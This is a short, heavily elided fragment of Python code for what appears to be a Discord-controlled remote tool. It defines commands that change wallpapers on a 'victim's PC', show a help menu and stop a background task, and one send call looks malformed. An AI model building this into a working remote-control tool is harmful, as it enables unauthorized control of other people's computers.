...
@client.command()
async def change_wallpapers_in_folder(ctx, folder_name: str="img", delay: float = 0.1):
...
async def show_cmd(ctx):
    ...
    my_embed.add_field(
        name="!change_wallpapers_in_folder ", value="Change wallpaper of victim's PC ", inline=True
    )
...
async def stop_bg(message):
    ...
    await message.send(myEmbd=myEmbed)
